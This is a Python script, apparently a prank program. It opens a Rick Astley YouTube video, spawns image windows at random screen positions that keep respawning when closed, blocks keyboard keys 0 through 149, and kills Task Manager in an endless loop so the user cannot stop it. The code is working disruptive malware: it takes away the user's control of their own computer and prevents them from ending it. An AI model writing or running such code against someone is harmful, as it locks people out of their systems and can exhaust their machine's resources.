import tkinter as tk
from PIL import Image, ImageTk
from multiprocessing import Process, freeze_support
from random import randint
import pyautogui as p
import keyboard
import psutil
import webbrowser
import media
import pafy


def showImage(i):
    #Making the window
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    img = Image.open("baby.webp")
    window = tk.Tk()
    window.title("?")
    tk_img = ImageTk.PhotoImage(img)
    label = tk.Label(window, image=tk_img)
    label.pack()

    #Setting possible x and y points on screenImage + making sure that it not off the screenImage
    x = randint(1, 1920 - 459)
    y = randint(1, 1050 - 466)

    #Putting the window in spot
    window.geometry(f"+{x}+{y}")
    window.mainloop()
    # Call screenImage again so that it will open more windows every time it is closed out
    screenImage()


def screenImage():
    processes = []
    for i in range(3):
        process = Process(target=showImage, args=(i + 1,))
        process.start()
        processes.append(process)

    while True:
        # x = randint(1, 1920)
        # y = randint(1, 1080)
        # p.moveTo(x, y, 0.5)
        #Checking for and closing task manager
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if process.info['name'] == 'Taskmgr.exe':
                psutil.Process(process.info['pid']).terminate()


def main():
    screenImage()


if __name__ == '__main__':
    freeze_support()
    for i in range(150):
        keyboard.block_key(i)
    main()
